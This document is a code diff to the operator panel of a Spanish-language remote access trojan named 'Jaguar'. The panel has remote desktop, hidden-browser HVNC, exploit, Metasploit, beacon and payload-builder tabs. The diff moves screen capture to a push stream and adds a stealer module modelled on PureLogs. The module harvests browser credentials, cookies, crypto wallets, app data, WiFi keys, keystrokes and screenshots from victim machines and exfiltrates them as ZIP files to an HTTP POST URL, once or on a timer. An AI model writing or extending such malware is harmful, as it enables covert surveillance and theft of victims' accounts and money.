@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-"""Ventana principal Jaguar — remote desktop + HVNC + escaner + MSF."""
+"""Ventana principal Jaguar — remote desktop + HVNC (push) + stealer + escaner + MSF."""
 
 import base64
 import json
@@ -72,7 +72,7 @@ class TerminalDialog(QDialog):
 
 
 class EscritorioDialog(QDialog):
-    """Escritorio remoto. TODAS las casillas entran DESMARCADAS."""
+    """Escritorio remoto. Casillas desmarcadas. Captura por STREAM (push)."""
 
     def __init__(self, cid, nombre, parent=None):
         super().__init__(parent)
@@ -82,7 +82,6 @@ class EscritorioDialog(QDialog):
         self._esc = 1.0
         self._off_x = 0
         self._off_y = 0
-        self._capturando = False
         self.setWindowTitle(f"Escritorio — {nombre}")
         self.resize(1000, 660)
         aplicar_tema_rojo_negro(self)
@@ -95,7 +94,7 @@ class EscritorioDialog(QDialog):
         self.chk_teclado = QCheckBox("Controlar teclado")
         self.chk_bloqueo = QCheckBox("Bloquear entrada local")
         for c in (self.chk_captura, self.chk_control, self.chk_teclado, self.chk_bloqueo):
-            c.setChecked(False)                       # <-- DESMARCADAS
+            c.setChecked(False)
             barra.addWidget(c)
         barra.addStretch()
         self.lbl_info = QLabel("visor")
@@ -142,25 +141,22 @@ class EscritorioDialog(QDialog):
         self.pantalla.setFocusPolicy(Qt.FocusPolicy.StrongFocus)
         lay.addWidget(self.pantalla, 1)
 
+        self.chk_captura.stateChanged.connect(lambda _=0: self._stream())
+        self.cb_fps.currentTextChanged.connect(lambda _: self._stream())
+        self.sl_cal.valueChanged.connect(lambda _: self._stream())
+        self.cb_esc.currentTextChanged.connect(lambda _: self._stream())
         self.timer = QTimer(self)
-        self.timer.timeout.connect(self._tick_captura)
-        self.timer.start(125)
-        QTimer.singleShot(150, self._tick_captura)
+        self.timer.timeout.connect(self._stream)
+        self.timer.start(2000)
 
-    def _ms(self):
-        try:
-            return max(125, int(1000 / int(self.cb_fps.currentText())))
-        except Exception:
-            return 200
-
-    def _tick_captura(self):
-        self.timer.setInterval(self._ms())
-        if not self.chk_captura.isChecked() or self._capturando:
+    def _stream(self):
+        if not self.chk_captura.isChecked():
+            self.parent._enviar_comando(self.cid, "captura_stream", {"on": False})
             return
-        self._capturando = True
         esc = int(self.cb_esc.currentText().rstrip("%")) / 100.0
-        self.parent._enviar_comando(self.cid, "captura", {
-            "formato": "jpeg", "calidad": self.sl_cal.value(), "escala": esc})
+        self.parent._enviar_comando(self.cid, "captura_stream", {
+            "on": True, "fps": int(self.cb_fps.currentText()),
+            "calidad": self.sl_cal.value(), "escala": esc})
 
     def _fullscreen(self):
         if self.isFullScreen():
@@ -172,7 +168,6 @@ class EscritorioDialog(QDialog):
         self.parent._screenshot(self.cid)
 
     def set_frame(self, pm, w, h):
-        self._capturando = False
         self.rem_w, self.rem_h = max(1, w), max(1, h)
         area = self.pantalla.size()
         escalado = pm.scaled(area, Qt.AspectRatioMode.KeepAspectRatio,
@@ -235,6 +230,10 @@ class EscritorioDialog(QDialog):
     def closeEvent(self, e):
         self.timer.stop()
         try:
+            self.parent._enviar_comando(self.cid, "captura_stream", {"on": False})
+        except Exception:
+            pass
+        try:
             self.parent.escritorios_por_cid.get(self.cid, []).remove(self)
         except ValueError:
             pass
@@ -242,7 +241,7 @@ class EscritorioDialog(QDialog):
 
 
 class HvncDialog(QDialog):
-    """HVNC. TODAS las casillas entran DESMARCADAS."""
+    """HVNC. Casillas desmarcadas. Captura por STREAM (push, sin round-trip)."""
 
     NAVEGADORES = ["chrome", "edge", "brave", "opera", "firefox"]
 
@@ -283,7 +282,7 @@ class HvncDialog(QDialog):
         self.chk_cmd = QCheckBox("CMD oculto")
         for c in (self.chk_oculto, self.chk_cookies, self.chk_control,
                   self.chk_captura, self.chk_shell, self.chk_cmd):
-            c.setChecked(False)                       # <-- DESMARCADAS
+            c.setChecked(False)
             fila.addWidget(c)
         fila.addStretch()
         self.lbl = QLabel("listo.")
@@ -302,7 +301,7 @@ class HvncDialog(QDialog):
         fila2.addWidget(QLabel("FPS:"))
         self.cb_fps = QComboBox()
         self.cb_fps.addItems(["4", "6", "8", "12", "15"])
-        self.cb_fps.setCurrentText("8")
+        self.cb_fps.setCurrentText("10")
         self.cb_fps.currentTextChanged.connect(self._opciones)
         fila2.addWidget(self.cb_fps)
         fila2.addWidget(QLabel("Escala:"))
@@ -336,8 +335,7 @@ class HvncDialog(QDialog):
         self.pantalla.setFocusPolicy(Qt.FocusPolicy.StrongFocus)
         l.addWidget(self.pantalla, 1)
 
-        self.timer = QTimer(self)
-        self.timer.timeout.connect(self._tick_captura)
+        self.chk_captura.stateChanged.connect(lambda _=0: self._stream())
         self.timer_estado = QTimer(self)
         self.timer_estado.timeout.connect(
             lambda: self.parent._enviar_comando(self.cid, "hvnc_estado"))
@@ -349,6 +347,15 @@ class HvncDialog(QDialog):
             "calidad": self.sl_cal.value(),
             "escala": esc,
             "fps": int(self.cb_fps.currentText())})
+        self._stream()
+
+    def _stream(self):
+        if not self.chk_captura.isChecked():
+            self.parent._enviar_comando(self.cid, "hvnc_stream", {"on": False})
+            return
+        self.parent._enviar_comando(self.cid, "hvnc_stream", {
+            "on": True, "fps": int(self.cb_fps.currentText())})
+        self.parent._enviar_comando(self.cid, "hvnc_captura", {"forzar": True})
 
     def iniciar(self, nav):
         self._nav_activo = nav
@@ -360,11 +367,6 @@ class HvncDialog(QDialog):
             "cmd": self.chk_cmd.isChecked()})
         self.lbl.setText(f"lanzando {nav}...")
         self._opciones()
-        self.timer.start(1000 // max(1, int(self.cb_fps.currentText())))
-
-    def _tick_captura(self):
-        if self.chk_captura.isChecked():
-            self.parent._enviar_comando(self.cid, "hvnc_captura")
 
     def set_estado(self, datos):
         est = datos.get("estado")
@@ -377,7 +379,6 @@ class HvncDialog(QDialog):
     def cerrar_nav(self):
         nav = self._nav_activo or "chrome"
         self.parent._enviar_comando(self.cid, "hvnc_cerrar", {"navegador": nav})
-        self.timer.stop()
         self._nav_activo = None
         self.lbl.setText("cerrado.")
 
@@ -448,8 +449,11 @@ class HvncDialog(QDialog):
                 self.parent._enviar_comando(self.cid, "hvnc_teclado", {"texto": t})
 
     def closeEvent(self, e):
-        self.timer.stop()
         self.timer_estado.stop()
+        try:
+            self.parent._enviar_comando(self.cid, "hvnc_stream", {"on": False})
+        except Exception:
+            pass
         try:
             self.parent.hvnc_por_cid.get(self.cid, []).remove(self)
         except ValueError:
@@ -505,6 +509,7 @@ class MainWindow(QMainWindow):
     _sig_msf = pyqtSignal(str)
     _sig_builder = pyqtSignal(str)
     _sig_nativo = pyqtSignal(str)
+    _sig_stealer = pyqtSignal(str)
 
     def __init__(self):
         super().__init__()
@@ -530,6 +535,7 @@ class MainWindow(QMainWindow):
         self._pings = {}
         self._screenshot_pend = {}
         self._clip_pend = {}
+        self._stealer_pend = {}
         self.msf = None
         self._mods_msf = []
 
@@ -540,6 +546,7 @@ class MainWindow(QMainWindow):
         self._sig_msf.connect(self._append_msf)
         self._sig_builder.connect(self._on_builder_log)
         self._sig_nativo.connect(self._append_nativo)
+        self._sig_stealer.connect(self._append_stealer)
 
         self._build_ui()
         self._ping_timer = QTimer(self)
@@ -643,6 +650,7 @@ class MainWindow(QMainWindow):
         self.tabs.setDocumentMode(True)
         self.tabs.addTab(self._tab_escaner(), "  Escáner  ")
         self.tabs.addTab(self._tab_exploits(), "  Exploits  ")
+        self.tabs.addTab(self._tab_stealer(), "  Stealer  ")
         self.tabs.addTab(self._tab_msf(), "  Metasploit  ")
         self.tabs.addTab(self._tab_beacons(), "  Beacons  ")
         self.tabs.addTab(self._tab_builder(), "  Builder  ")
@@ -734,6 +742,58 @@ class MainWindow(QMainWindow):
         fila.addWidget(b3)
         fila.addStretch()
         l.addLayout(fila)
+        return w
+
+    def _tab_stealer(self):
+        w = QWidget()
+        l = QVBoxLayout(w)
+        l.setContentsMargins(10, 10, 10, 10)
+        l.setSpacing(6)
+        l.addWidget(QLabel("<b style='color:#ff2b2b;'>STEALER (estilo PureLogs)</b> — "
+                           "recolecta credenciales, cookies, wallets, apps, WiFi, "
+                           "teclado y pantalla, y exfiltra en ZIP."))
+        form = QGridLayout()
+        form.setHorizontalSpacing(8)
+        form.addWidget(QLabel("URL de exfiltración (HTTP POST):"), 0, 0)
+        self.in_st_url = QLineEdit()
+        self.in_st_url.setPlaceholderText("http://tu-servidor/subir.php  (vacío = solo local)")
+        form.addWidget(self.in_st_url, 0, 1)
+        form.addWidget(QLabel("Intervalo auto (s):"), 0, 2)
+        self.in_st_int = QLineEdit("900")
+        self.in_st_int.setFixedWidth(80)
+        form.addWidget(self.in_st_int, 0, 3)
+        l.addLayout(form)
+
+        casillas = QHBoxLayout()
+        self.st_chk = {}
+        for clave, etq in (("navegadores", "Navegadores"), ("wallets", "Wallets"),
+                           ("apps", "Aplicaciones"), ("wifi", "WiFi"),
+                           ("sistema", "Sistema"), ("keylog", "Teclado"),
+                           ("screenshot", "Pantalla")):
+            c = QCheckBox(etq)
+            c.setChecked(True)
+            self.st_chk[clave] = c
+            casillas.addWidget(c)
+        casillas.addStretch()
+        l.addLayout(casillas)
+
+        fila = QHBoxLayout()
+        for txt, fn in [("🕵  Recolectar en seleccionado", self._stealer_recolectar),
+                        ("📊  Estado", self._stealer_estado),
+                        ("📥  Traer paquete (.zip)", self._stealer_traer),
+                        ("☁  Exfiltrar ahora", self._stealer_exfil),
+                        ("🔁  Auto ON/OFF", self._stealer_auto)]:
+            b = QPushButton(txt)
+            b.setStyleSheet(ESTILO_BOTON)
+            b.clicked.connect(fn)
+            fila.addWidget(b)
+        fila.addStretch()
+        l.addLayout(fila)
+
+        self.out_stealer = QPlainTextEdit()
+        self.out_stealer.setReadOnly(True)
+        self.out_stealer.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
+        l.addWidget(self.out_stealer, 1)
         return w
 
     def _tab_msf(self):
@@ -1016,7 +1076,16 @@ class MainWindow(QMainWindow):
             self._log(f"[-] {cid[:8]} desconectado")
 
     def _on_mensaje_recibido(self, cid, msg):
-        if msg.get("tipo") != "respuesta":
+        tipo = msg.get("tipo")
+        if tipo == "evento":                       # <-- push del agente
+            ev = msg.get("evento")
+            datos = msg.get("datos") or {}
+            if ev == "hvnc_frame":
+                self._enrutar_hvnc(cid, datos)
+            elif ev == "escritorio_frame":
+                self._enrutar_frame(cid, datos)
+            return
+        if tipo != "respuesta":
             return
         cmd, ok, datos = msg.get("cmd"), msg.get("ok"), msg.get("datos")
         if cmd in ("ping", "raton", "teclado", "hvnc_raton", "hvnc_teclado") and ok:
@@ -1039,11 +1108,15 @@ class MainWindow(QMainWindow):
             QApplication.clipboard().setText((datos or {}).get("texto", ""))
             self._log(f"[{cid[:8]}] portapapeles remoto copiado")
             return
+        if cmd and cmd.startswith("stealer_") and ok:
+            self._stealer_msg(cid, cmd, datos or {})
+            return
         self._log(f"[{cid[:8]}] '{cmd}' -> {'OK' if ok else 'ERROR'}")
         if ok and cmd == "captura":
             self._enrutar_frame(cid, datos or {})
-        if cmd in ("hvnc_iniciar", "hvnc_cerrar", "hvnc_navegar",
-                   "webcam_iniciar", "webcam_parar", "hvnc_opciones", "bloquear_entrada"):
+        if cmd in ("hvnc_iniciar", "hvnc_cerrar", "hvnc_navegar", "hvnc_stream",
+                   "captura_stream", "webcam_iniciar", "webcam_parar",
+                   "hvnc_opciones", "bloquear_entrada"):
             return
         for dlg in self.dialogs_por_cid.get(cid, []):
             if not ok:
@@ -1061,6 +1134,10 @@ class MainWindow(QMainWindow):
 
     def _append_nativo(self, t):
         self.out_nativo.appendPlainText(t)
+
+    def _append_stealer(self, t):
+        if hasattr(self, "out_stealer") and self.out_stealer is not None:
+            self.out_stealer.appendPlainText(t)
 
     def _refrescar_conteo(self):
         self.lbl_n.setText(str(len(self.clientes)))
@@ -1089,6 +1166,74 @@ class MainWindow(QMainWindow):
             self._pings[cid] = ts
             self.servidor.enviar_comando(cid, "ping", {"ts": ts})
 
+    # ================================================================= stealer
+    def _cid_sel(self):
+        it = self.tree.currentItem()
+        return it.data(0, Qt.ItemDataRole.UserRole) if it else None
+
+    def _stealer_recolectar(self):
+        cid = self._cid_sel()
+        if not cid:
+            QMessageBox.information(self, "Stealer", "Selecciona un cliente.")
+            return
+        args = {k: c.isChecked() for k, c in self.st_chk.items()}
+        args["url"] = self.in_st_url.text().strip()
+        self._enviar_comando(cid, "stealer_recolectar", args)
+        self._append_stealer(f"[{cid[:8]}] recolección iniciada...")
+
+    def _stealer_estado(self):
+        cid = self._cid_sel()
+        if cid:
+            self._enviar_comando(cid, "stealer_estado")
+
+    def _stealer_traer(self):
+        cid = self._cid_sel()
+        if not cid:
+            return
+        self._stealer_pend[cid] = True
+        self._enviar_comando(cid, "stealer_paquete")
+
+    def _stealer_exfil(self):
+        cid = self._cid_sel()
+        if not cid:
+            return
+        url = self.in_st_url.text().strip()
+        if not url:
+            QMessageBox.information(self, "Stealer", "Indica una URL de exfiltración.")
+            return
+        self._enviar_comando(cid, "stealer_exfil", {"url": url})
+
+    def _stealer_auto(self):
+        cid = self._cid_sel()
+        if not cid:
+            return
+        self._enviar_comando(cid, "stealer_auto", {
+            "on": True, "url": self.in_st_url.text().strip(),
+            "intervalo": int(self.in_st_int.text() or 900)})
+
+    def _stealer_msg(self, cid, cmd, datos):
+        if cmd == "stealer_estado":
+            self._append_stealer(
+                f"[{cid[:8]}] fase={datos.get('fase')} prog={datos.get('prog')} "
+                f"activo={datos.get('activo')} auto={datos.get('auto')} "
+                f"zip={datos.get('zip')}")
+        elif cmd == "stealer_paquete":
+            b64 = datos.get("b64", "")
+            if not b64:
+                self._append_stealer(f"[{cid[:8]}] sin paquete: {datos.get('error')}")
+                return
+            ruta, _ = QFileDialog.getSaveFileName(
+                self, "Guardar paquete", datos.get("nombre", "stealer.zip"),
+                "ZIP (*.zip)")
+            if ruta:
+                with open(ruta, "wb") as f:
+                    f.write(base64.b64decode(b64))
+                self._append_stealer(f"[{cid[:8]}] paquete guardado en {ruta} "
+                                     f"({datos.get('tamano')} bytes)")
+        else:
+            self._append_stealer(f"[{cid[:8]}] {cmd}: "
+                                 + json.dumps(datos, ensure_ascii=False))
+
     # ================================================================= contexto
     def _menu_contexto(self, pos):
         it = self.tree.itemAt(pos)
@@ -1100,6 +1245,8 @@ class MainWindow(QMainWindow):
             ("🖥  Terminal", lambda: self._abrir_terminal(cid)),
             ("🖥  Escritorio remoto (control)", lambda: self._abrir_escritorio(cid)),
             ("🌐  HVNC (navegador)", lambda: self._abrir_hvnc(cid)),
+            ("🕵  Stealer: recolectar", lambda: self._stealer_recolectar_cid(cid)),
+            ("🕵  Stealer: traer paquete", lambda: self._stealer_traer_cid(cid)),
             ("📊  Info del sistema", lambda: self._enviar_comando(cid, "sysinfo")),
             ("📂  Listar directorio", lambda: self._pedir_y(cid, "listar_dir", "Ruta", ".")),
             ("⚡  Procesos", lambda: self._enviar_comando(cid, "procesos")),
@@ -1127,12 +1274,22 @@ class MainWindow(QMainWindow):
             m.addAction(a)
         m.exec(self.tree.viewport().mapToGlobal(pos))
 
+    def _stealer_recolectar_cid(self, cid):
+        args = {k: c.isChecked() for k, c in self.st_chk.items()}
+        args["url"] = self.in_st_url.text().strip()
+        self._enviar_comando(cid, "stealer_recolectar", args)
+        self.tabs.setCurrentIndex(2)
+
+    def _stealer_traer_cid(self, cid):
+        self._enviar_comando(cid, "stealer_paquete")
+
     def _enviar_comando(self, cid, cmd, args=None):
         if cid not in self.clientes:
             return
         self.servidor.enviar_comando(cid, cmd, args or {})
         if cmd not in ("raton", "teclado", "ping", "hvnc_raton", "hvnc_captura",
-                       "webcam_frame", "captura", "hvnc_estado"):
+                       "hvnc_teclado", "hvnc_stream", "captura_stream",
+                       "webcam_frame", "captura", "hvnc_estado", "stealer_estado"):
             self._log(f"[→] '{cmd}' a {cid[:8]}")
 
     def _pedir_y(self, cid, cmd, etiqueta, defecto):
@@ -1172,7 +1329,9 @@ class MainWindow(QMainWindow):
 
     def _enrutar_frame(self, cid, datos):
         b64 = datos.get("b64", "")
-        if cid in self._screenshot_pend and b64:
+        if not b64:
+            return
+        if cid in self._screenshot_pend:
             try:
                 carpeta = self._screenshot_pend.pop(cid)
                 nombre = f"{cid[:8]}_{time.strftime('%Y%m%d_%H%M%S')}.png"
@@ -1187,19 +1346,17 @@ class MainWindow(QMainWindow):
                 pm.loadFromData(base64.b64decode(b64))
                 if not pm.isNull():
                     dlg.set_frame(pm, datos.get("w", 1920), datos.get("h", 1080))
-                else:
-                    dlg._capturando = False
             except Exception:
                 pass
 
     def _enrutar_hvnc(self, cid, datos):
+        b64 = datos.get("b64", "")
+        if not b64:
+            return
         for dlg in self.hvnc_por_cid.get(cid, []):
             try:
-                raw = base64.b64decode(datos.get("b64", ""))
-                if not raw:
-                    continue
                 pm = QPixmap()
-                pm.loadFromData(raw)
+                pm.loadFromData(base64.b64decode(b64))
                 dlg.set_frame(pm, datos.get("w", 1200), datos.get("h", 800))
             except Exception:
                 pass
